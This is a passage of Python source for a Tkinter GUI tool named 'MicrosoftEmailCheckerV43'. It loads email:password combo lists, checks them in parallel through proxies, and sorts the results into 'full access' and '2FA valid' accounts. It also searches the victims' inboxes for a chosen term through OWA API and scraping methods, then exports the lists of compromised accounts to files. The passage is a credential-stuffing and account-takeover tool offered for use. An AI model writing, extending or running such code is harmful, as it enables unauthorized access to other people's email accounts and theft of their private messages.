        self.twofa_count = 0
        self.failed_count = 0
        self.retry_count = 0
        self.email_count = 0
        self.no_email_count = 0
        
        # Reset method stats
        self.method_stats = {
            'owa_api_success': 0,
            'html_scrape_success': 0,
            'mobile_scrape_success': 0,
            'all_failed': 0,
            'inbox_checks_performed': 0
        }
        
        # Clear results
        self.full_access.clear()
        self.twofa_valid.clear()
        self.failed.clear()
        self.email_found.clear()
        self.no_email.clear()
        
        # Clear displays
        self.access_text.delete(1.0, tk.END)
        self.twofa_text.delete(1.0, tk.END)
        
        # Set state
        self.running = True
        self.paused = False
        self.start_time = time.time()
        
        # Update buttons
        self.start_btn.config(state=tk.DISABLED)
        self.pause_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.NORMAL)
        
        # Load combos
        combos = []
        with open(self.combo_file, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                if ':' in line:
                    combos.append(line.strip())
        
        proxy_status = "with proxies" if self.use_proxies.get() else "without proxies"
        inbox_status = "ENABLED" if self.enable_inbox_search.get() else "DISABLED"
        search_term = self.inbox_search_email.get()
        
        self.log(f"Starting SESSION SCRAPING {proxy_status}", "info")
        self.log(f"Inbox search: {inbox_status} - Looking for: {search_term}", "info")
        self.log(f"Methods: OWA API, HTML Scrape, Mobile={self.use_mobile_fallback.get()}", "info")
        self.log(f"Delay between accounts: {self.check_delay.get()}s", "info")
        self.log(f"Checking {len(combos):,} accounts with {self.threads.get()} threads", "info")
        
        # Start thread pool
        def run_checks():
            with ThreadPoolExecutor(max_workers=self.threads.get()) as executor:
                futures = [executor.submit(self.worker, combo) for combo in combos]
                
                for future in as_completed(futures):
                    if not self.running:
                        break
            
            if self.running:
                self.complete()
        
        thread = threading.Thread(target=run_checks, daemon=True)
        thread.start()
    
    def toggle_pause(self):
        """Toggle pause state"""
        if not self.running:
            return
            
        self.paused = not self.paused
        
        if self.paused:
            self.pause_btn.config(text="▶️ Resume", bg='#107c10')
            self.status_bar.config(text="Status: Paused")
        else:
            self.pause_btn.config(text="⏸️ Pause", bg='#ffb900')
            self.status_bar.config(text="Status: Running")
    
    def stop_checking(self):
        """Stop checking process"""
        self.running = False
        self.paused = False
        
        self.start_btn.config(state=tk.NORMAL)
        self.pause_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.DISABLED)
        
        self.status_bar.config(text="Status: Stopped")
    
    def complete(self):
        """Checking complete with statistics"""
        self.running = False
        
        self.start_btn.config(state=tk.NORMAL)
        self.pause_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.DISABLED)
        
        elapsed = time.time() - self.start_time
        search_term = self.inbox_search_email.get().split('.')[0].capitalize()
        
        self.log("="*60, "info")
        self.log(f"✅ COMPLETE! {self.checked:,} accounts in {elapsed:.1f}s", "success")
        self.log(f"Full Access: {self.success_count}", "success")
        
        if self.enable_inbox_search.get():
            self.log(f"  📧 With {search_term}: {self.email_count}", "success")
            self.log(f"  📭 No {search_term}: {self.no_email_count}", "info")
            
            self.log("Scraping Method Statistics:", "info")
            self.log(f"  OWA API successes: {self.method_stats['owa_api_success']}", "success")
            self.log(f"  HTML Scrape successes: {self.method_stats['html_scrape_success']}", "success")
            self.log(f"  Mobile successes: {self.method_stats['mobile_scrape_success']}", "success")
            self.log(f"  Not found: {self.method_stats['all_failed']}", "warning")
            
            if self.method_stats['inbox_checks_performed'] > 0:
                found_rate = (self.email_count / self.method_stats['inbox_checks_performed']) * 100
                self.log(f"  {search_term} detection rate: {found_rate:.1f}%", "info")
        
        self.log(f"2FA Valid: {self.twofa_count}", "twofa")
        self.log(f"Failed: {self.failed_count}", "error")
        
        self.status_bar.config(
            text=f"Complete | {search_term}: {self.email_count} | No {search_term}: {self.no_email_count}"
        )

    def export_all(self):
        """Export results to files"""
        if not any([self.full_access, self.twofa_valid, self.failed, self.email_found, self.no_email]):
            messagebox.showinfo("No Results", "No results to export")
            return
        
        directory = filedialog.askdirectory(title="Select Export Directory")
        if not directory:
            return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        search_term = self.inbox_search_email.get().split('.')[0].lower()
        
        # Export all full access accounts
        if self.full_access:
            filename = os.path.join(directory, f"full_access_{timestamp}.txt")
            with open(filename, 'w') as f:
                for account in self.full_access:
                    f.write(f"{account}\n")
        
        # Export found accounts
        if self.email_found:
            filename = os.path.join(directory, f"{search_term}_found_{timestamp}.txt")
            with open(filename, 'w') as f:
                for account in self.email_found:
                    f.write(f"{account}\n")
            self.log(f"📧 Exported {len(self.email_found)} {search_term} accounts", "success")
        
        # Export no match accounts
        if self.no_email:
            filename = os.path.join(directory, f"no_{search_term}_{timestamp}.txt")
            with open(filename, 'w') as f:
                for account in self.no_email:
                    f.write(f"{account}\n")
        
        # Export 2FA accounts
        if self.twofa_valid:
            filename = os.path.join(directory, f"2fa_valid_{timestamp}.txt")
            with open(filename, 'w') as f:
                for account in self.twofa_valid:
                    f.write(f"{account}\n")
        
        # Export method statistics
        if self.method_stats['inbox_checks_performed'] > 0:
            filename = os.path.join(directory, f"scraping_stats_{timestamp}.txt")
            with open(filename, 'w') as f:
                f.write(f"Session Scraping Statistics\n")
                f.write(f"===========================\n")
                f.write(f"OWA API successes: {self.method_stats['owa_api_success']}\n")
                f.write(f"HTML Scrape successes: {self.method_stats['html_scrape_success']}\n")
                f.write(f"Mobile successes: {self.method_stats['mobile_scrape_success']}\n")
                f.write(f"Not found: {self.method_stats['all_failed']}\n")
                f.write(f"Total inbox checks: {self.method_stats['inbox_checks_performed']}\n")
        
        self.log(f"✅ Exported all results to {directory}", "success")
    
    def copy_full_access(self):
        """Copy full access accounts"""
        content = self.access_text.get(1.0, tk.END).strip()
        if content:
            self.root.clipboard_clear()
            self.root.clipboard_append(content)
            self.log("Copied full access accounts", "success")
    
    def copy_twofa(self):
        """Copy 2FA accounts"""
        content = self.twofa_text.get(1.0, tk.END).strip()
        if content:
            self.root.clipboard_clear()
            self.root.clipboard_append(content)
            self.log("Copied 2FA valid accounts", "success")

def main():
    """Main entry point"""
    try:
        import requests
    except ImportError:
        print("Installing required library: requests")
        import subprocess
        subprocess.check_call(['pip', 'install', 'requests'])
        import requests
    
    root = tk.Tk()
    app = MicrosoftEmailCheckerV43(root)
    root.mainloop()

if __name__ == "__main__":
    main()